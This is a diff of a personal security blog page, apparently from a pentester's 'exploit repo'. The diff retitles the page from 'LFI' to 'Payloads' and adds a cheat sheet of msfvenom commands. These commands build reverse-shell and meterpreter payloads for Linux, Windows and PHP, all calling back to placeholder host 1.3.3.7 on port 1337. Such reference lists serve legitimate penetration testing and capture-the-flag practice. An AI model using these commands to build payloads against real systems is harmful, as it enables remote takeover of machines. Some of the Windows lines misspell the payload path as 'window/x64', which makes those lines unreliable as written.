@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Local File Inclusion'>
-<title>LFI</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Payloads that I use often'>
+<title>Payloads</title>
 
 <link rel='canonical' href='https://sudo-echo-jin.github.io/p/file-inclusion/'>
 
-<link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='LFI'>
-<meta property='og:description' content='Local File Inclusion'>
+<link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='Payloads'>
+<meta property='og:description' content='Payloads that I use often'>
 <meta property='og:url' content='https://sudo-echo-jin.github.io/p/file-inclusion/'>
 <meta property='og:site_name' content='Jin&#39;s Exploit Repo'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Web' /><meta property='article:tag' content='OWASP top 10' /><meta property='article:published_time' content='2022-03-06T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-03-06T00:00:00&#43;00:00'/><meta property='og:image' content='https://sudo-echo-jin.github.io/p/file-inclusion/bubbles.jpg' />
-<meta name="twitter:title" content="LFI">
-<meta name="twitter:description" content="Local File Inclusion"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://sudo-echo-jin.github.io/p/file-inclusion/bubbles.jpg' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='payload' /><meta property='article:published_time' content='2022-03-06T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-03-06T00:00:00&#43;00:00'/><meta property='og:image' content='https://sudo-echo-jin.github.io/p/file-inclusion/payload.jpg' />
+<meta name="twitter:title" content="Payloads">
+<meta name="twitter:description" content="Payloads that I use often"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://sudo-echo-jin.github.io/p/file-inclusion/payload.jpg' />
     </head>
     <body class="
     article-page
@@ -193,12 +193,12 @@
     <header class="article-header">
         <div class="article-image">
             <a href="/p/file-inclusion/">
-                <img src="/p/file-inclusion/bubbles_hu59f52cd2db3f02cfe123f823a5a59ac0_157699_800x0_resize_q75_box.jpg"
-                        srcset="/p/file-inclusion/bubbles_hu59f52cd2db3f02cfe123f823a5a59ac0_157699_800x0_resize_q75_box.jpg 800w, /p/file-inclusion/bubbles_hu59f52cd2db3f02cfe123f823a5a59ac0_157699_1600x0_resize_q75_box.jpg 1600w"
+                <img src="/p/file-inclusion/payload_hubc2ac90df8eb01bef330491e1f5c6e98_395296_800x0_resize_q75_box.jpg"
+                        srcset="/p/file-inclusion/payload_hubc2ac90df8eb01bef330491e1f5c6e98_395296_800x0_resize_q75_box.jpg 800w, /p/file-inclusion/payload_hubc2ac90df8eb01bef330491e1f5c6e98_395296_1600x0_resize_q75_box.jpg 1600w"
                         width="800" 
-                        height="500" 
+                        height="534" 
                         loading="lazy"
-                        alt="Featured image of post LFI" />
+                        alt="Featured image of post Payloads" />
                 
             </a>
         </div>
@@ -217,12 +217,12 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/file-inclusion/">LFI</a>
+            <a href="/p/file-inclusion/">Payloads</a>
         </h2>
     
         
         <h3 class="article-subtitle">
-            Local File Inclusion
+            Payloads that I use often
         </h3>
         
     </div>
@@ -273,7 +273,44 @@
     <section class="article-content">
     
     
-    <h1 id="lfi">LFI</h1>
+    <p>Cover photo by <a class="link" href="https://unsplash.com/@switch_dtp_fotografie"  target="_blank" rel="noopener"
+    >https://unsplash.com/@switch_dtp_fotografie</a></p>
+<h1 id="msfvenom">Msfvenom</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Stageless</span>
+</span></span><span class="line"><span class="cl">msfvenom -p linux/x64/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>1.3.3.7 <span class="nv">lport</span><span class="o">=</span><span class="m">1337</span> -f elf &gt; shell.elf
+</span></span><span class="line"><span class="cl">msfvenom -p linux/x64/meterpreter_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>1.3.3.7 <span class="nv">lport</span><span class="o">=</span><span class="m">1337</span> -f elf &gt; meter.elf
+</span></span><span class="line"><span class="cl">msfvenom -p window/x64/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>1.3.3.7 <span class="nv">lport</span><span class="o">=</span><span class="m">1337</span> -f exe &gt; shell.exe
+</span></span><span class="line"><span class="cl">msfvenom -p window/x64/meterpreter_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>1.3.3.7 <span class="nv">lport</span><span class="o">=</span><span class="m">1337</span> -f exe &gt; meter.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Staged</span>
+</span></span><span class="line"><span class="cl">msfvenom -p linux/x64/shell/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>1.3.3.7 <span class="nv">lport</span><span class="o">=</span><span class="m">1337</span> -f elf &gt; shell.elf
+</span></span><span class="line"><span class="cl">msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>1.3.3.7 <span class="nv">lport</span><span class="o">=</span><span class="m">1337</span> -f elf &gt; meter.elf
+</span></span><span class="line"><span class="cl">msfvenom -p window/x64/shell/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>1.3.3.7 <span class="nv">lport</span><span class="o">=</span><span class="m">1337</span> -f exe &gt; shell.exe
+</span></span><span class="line"><span class="cl">msfvenom -p window/x64/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>1.3.3.7 <span class="nv">lport</span><span class="o">=</span><span class="m">1337</span> -f exe &gt; meter.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Web</span>
+</span></span><span class="line"><span class="cl">msfvenom -p php/meterpreter_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>1.3.3.7 <span class="nv">lport</span><span class="o">=</span><span class="m">1337</span> -f raw &gt; meter.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="lfi">LFI</h1>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -300,9 +337,7 @@
     
     <section class="article-tags">
         
-            <a href="/tags/web/">Web</a>
-        
-            <a href="/tags/owasp-top-10/">OWASP top 10</a>
+            <a href="/tags/payload/">payload</a>
         
     </section>
 
@@ -340,13 +375,13 @@
         
         
             <div class="article-image">
-                <img src="/p/windows-resource/bubbles.e318e5a9f92f6394af6f7d7edae19d0d_hu59f52cd2db3f02cfe123f823a5a59ac0_157699_250x150_fill_q75_box_smart1.jpg" 
+                <img src="/p/windows-resource/window.023c0ebb166abe56ddff502c4a4c2419_hu84c12b19066a3816b425d98ed68d9d7c_744498_250x150_fill_q75_box_smart1.jpg" 
                         width="250" 
                         height="150" 
                         loading="lazy"
                         alt="Featured image of post Windows Basic"
                         data-key="windows-resource" 
-                        data-hash="md5-4xjlqfkvY5Svb31&#43;2uGdDQ==">
+                        data-hash="md5-AjwOuxZqvlbd/1AsSkwkGQ==">
                 
             </div>
         
